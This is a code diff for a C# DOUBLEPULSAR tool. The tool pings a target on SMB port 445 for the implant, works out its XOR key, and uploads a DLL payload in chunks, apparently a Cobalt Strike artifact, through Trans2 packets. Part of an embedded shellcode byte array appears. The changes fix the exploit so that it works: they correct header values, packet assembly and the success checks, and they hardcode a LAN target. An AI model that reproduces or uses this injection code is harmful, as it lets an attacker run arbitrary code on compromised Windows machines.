@@ -361,9 +361,9 @@ namespace DoublePulsar
                 SecurityFeatures = 0x0000000000000000,
                 reserved = 0x0000,
                 TID = TID, /*0xfeff*/
-                PIDLow = 0x4b2f,
+                PIDLow = 0xfeff, /* 0x4b2f */
                 UID = UID,
-                MID = 0x0042
+                MID = 0x0041  /* 0x0042 */
             };
             byte[] headerBytes = GetBytes(header);
 
@@ -402,7 +402,8 @@ namespace DoublePulsar
             byte[] paramz = Parameters.ToArray();
 
 
-            byte[] DoublepulsarPINGPKT = GetBytes(ping).Concat(Parameters.ToArray()).ToArray();
+            //byte[] DoublepulsarPINGPKT = GetBytes(ping).Concat(Parameters.ToArray()).ToArray();
+            byte[] DoublepulsarPINGPKT = GetBytes(ping).ToArray();
             byte[] pkt = headerBytes.Concat(DoublepulsarPINGPKT).ToArray();
             pkt = pkt.Concat(paramz.ToArray()).ToArray();
 
@@ -689,7 +690,7 @@ namespace DoublePulsar
 
         static void Main(string[] args)
         {
-            string target = args[1];
+            string target = "192.168.0.13";
             string ip = target;
             int port = 445;
             TcpClient client = new TcpClient(ip, port);
@@ -718,12 +719,13 @@ namespace DoublePulsar
             //if (final_response[34] == 0x51)
             if (header.MID == 0x51)
             {
-                byte[] signature = Slice(pingrequestresponse, 18, 4);
+                //byte[] signature = Slice(pingrequestresponse, 18, 4);
+                byte[] signature = Slice(pingrequestresponse, 14, 4);
                 UInt32 signature_long = LE2INT(signature);
                 UInt32 key = calculate_doublepulsar_xor_key(signature_long);
                 string arch = calculate_doublepulsar_arch(signature_long);
 
-                Console.WriteLine("DOUBLEPULSAR SMB IMPLANT DETECTED!!! Arch: {arch}, XOR Key: {key,4:X}");
+                Console.WriteLine($"DOUBLEPULSAR SMB IMPLANT DETECTED!!! Arch: {arch}, XOR Key: 0x{key,4:X}");
 
                 System.Console.WriteLine("Preparing Doublepulsar upload dll payload package!");
 
@@ -957,15 +959,14 @@ namespace DoublePulsar
                 0x29, 0xD9, 0x48, 0x89, 0xDF, 0xF3, 0xAA, 0x48, 0x8D, 0x0D, 0x0D, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x1D, 0x96, 0xF0, 0xFF, 0xFF, 0x48, 0x29, 0xD9, 0x48, 0x89, 0xDF,
                 0xF3, 0xAA, 0x58, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x5E, 0x5F, 0x5D, 0x5B, 0xC3, 0xEB, 0x08, 0x00, 0x14, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00
                 };
-
-                byte[] buf = new byte[1024];
+                byte[] recv_buffer = new byte[1024];
 
                 //UInt32 Key = 0x58581162;
                 UInt32 Key = key;
                 byte[] ByteXORKEY = INT2LE(Key);
 
                 //Your DLL file here
-                byte[] array = File.ReadAllBytes("D:\\strike\\artifact.dll");
+                byte[] array = File.ReadAllBytes("D:\\strike\\file.dll");
                 //System.Console.WriteLine(HexDump(array));
                 System.Console.WriteLine("File imported into memory!");
                 System.Console.WriteLine("Size of file:  {0}", array.Length);
@@ -1034,7 +1035,7 @@ namespace DoublePulsar
                     DataOffset = 0x004e, // DataDisplacement (NETBIOS) + (SMB) + (transaction2SecondaryRequest) (parameters=12) -> ( SMBData=4096 MAX)
                     setupcount = 1, //0x01;
                     reserved3 = 0x00,
-                    subcommand = 0x000E,
+                    subcommand = 0x000e,
                     ByteCount = 0,
                     padding = 0x00
                 };
@@ -1047,15 +1048,18 @@ namespace DoublePulsar
                     _reserved = 0x00,
                     errorCode = 0x0000,
                     flags = 0x18,
-                    flags2 = 0x2001,
+                    flags2 = 0xc007,
                     PIDHigh = 0x0000,
                     SecurityFeatures = 0x0000000000000000,
                     reserved = 0x0000,
-                    TID = 0xfeff,
-                    PIDLow = 0x4b2f,
+                    TID = 0x0008, /* 0xfeff */
+                    PIDLow = 0xfeff, /* 0x4b2f */
                     UID = 0x0008,
-                    MID = 0x4200
+                    MID = 0x0042
                 };
+
+                Exec_header.TID = header.TID;
+                Exec_header.UID = header.UID;
 
                 byte[] ByteTotalByteCount;
                 byte[] ByteChunkSize;
@@ -1089,8 +1093,6 @@ namespace DoublePulsar
                     }
                     System.Console.WriteLine(HexDump(paramz));
 
-                    Exec_header.TID = header.TID;
-                    Exec_header.UID = header.UID;
 
                     //Merge SMBHeader with the transaction2SecondaryRequest
                     byte[] headerBytes = GetBytes(Exec_header);
@@ -1133,20 +1135,46 @@ namespace DoublePulsar
                     {
                         sock.Send(fullMessage);
                         System.Console.WriteLine("Sent a packet!");
-                        sock.Receive(buf, 1024, SocketFlags.None);
-                        header = SMB_HeaderFromBytes(buf);
-                        // Check for 0x52 response to indicate DOUBLEPULSAR worked
-                        // 0x52 = success
-                        // 0x62 = parameter failure
-                        // 0x72 = alloc error
-                        if (header.MID == 0x52)
-                        {
-                            System.Console.WriteLine("[{ip}] DOUBLEPULSAR - Returned {final_response[34]}.  SUCCESS!");
-                        }
                     }
                     catch (Exception e)
                     {
                         Console.WriteLine("Socket Error, during sending: " + e.Message);
+                    }
+
+                    try
+                    {
+                        sock.Receive(recv_buffer);
+                        // Check for 0x52 response to indicate DOUBLEPULSAR worked
+                        // 0x52 = success
+                        // 0x62 = parameter failure
+                        // 0x72 = alloc error
+
+                        //This will NOT work because we didn't use the SendSMBMessage function
+                        /* 
+                        header = SMB_HeaderFromBytes(recv_buffer);
+                        if (header.MID == 0x52)
+                        {
+                            System.Console.WriteLine($"[{ip}] DOUBLEPULSAR - Returned {recv_buffer[34]}.  SUCCESS!");
+                        }*/
+
+                        /* 
+                         * In this code, we are not using the SendSMBMessage function
+                         * Because we are not using the SendSMBMessage function
+                         * SMB_HeaderFromBytes() becomes equally useless
+                         * 
+                         * We are just reading the Doublepulsar Multiplex ID at buffer[34]
+                         * since we did not use the SendSMBMessage -> ReceiveSMBMessage becomes useless
+                         */
+
+                        if (recv_buffer[34] == 0x52)
+                        {
+                            System.Console.WriteLine($"[{ip}] DOUBLEPULSAR - Returned {recv_buffer[34]}.  SUCCESS!");
+                        }
+                    }
+
+                    catch (Exception e)
+                    {
+                        Console.WriteLine("Recv Error: " + e.Message);
                     }
 
                     bytesLeft -= 4096;
@@ -1173,9 +1201,6 @@ namespace DoublePulsar
                     }
 
                     System.Console.WriteLine(HexDump(paramz));
-
-                    Exec_header.TID = header.TID;
-                    Exec_header.UID = header.UID;
 
                     //Merge SMBHeader with the transaction2SecondaryRequest
                     byte[] headerBytes = GetBytes(Exec_header);
@@ -1218,21 +1243,46 @@ namespace DoublePulsar
                     {
                         sock.Send(fullMessage);
                         System.Console.WriteLine("Sent a packet!");
-                        sock.Receive(buf, 1024, SocketFlags.None);
-                        header = SMB_HeaderFromBytes(buf);
-
-                        // Check for 0x52 response to indicate DOUBLEPULSAR worked
-                        // 0x52 = success
-                        // 0x62 = parameter failure
-                        // 0x72 = alloc error
-                        if (header.MID == 0x52)
-                        {
-                            System.Console.WriteLine("[{ip}] DOUBLEPULSAR - Returned {final_response[34]}.  SUCCESS!");
-                        }
                     }
                     catch (Exception e)
                     {
                         Console.WriteLine("Socket Error, during sending: " + e.Message);
+                    }
+
+                    try
+                    {
+                        sock.Receive(recv_buffer);
+                        // Check for 0x52 response to indicate DOUBLEPULSAR worked
+                        // 0x52 = success
+                        // 0x62 = parameter failure
+                        // 0x72 = alloc error
+
+                        //This will NOT work because we didn't use the SendSMBMessage function
+                        /* 
+                        header = SMB_HeaderFromBytes(recv_buffer);
+                        if (header.MID == 0x52)
+                        {
+                            System.Console.WriteLine($"[{ip}] DOUBLEPULSAR - Returned {recv_buffer[34]}.  SUCCESS!");
+                        }*/
+
+                        /* 
+                         * In this code, we are not using the SendSMBMessage function
+                         * Because we are not using the SendSMBMessage function
+                         * SMB_HeaderFromBytes() becomes equally useless
+                         * 
+                         * We are just reading the Doublepulsar Multiplex ID at buffer[34]
+                         * since we did not use the SendSMBMessage -> ReceiveSMBMessage becomes useless
+                         */
+
+                        if (recv_buffer[34] == 0x52)
+                        {
+                            System.Console.WriteLine($"[{ip}] DOUBLEPULSAR - Returned {recv_buffer[34]}.  SUCCESS!");
+                        }
+                    }
+
+                    catch (Exception e)
+                    {
+                        Console.WriteLine("Recv Error: " + e.Message);
                     }
 
                     bytesLeft -= remainder;
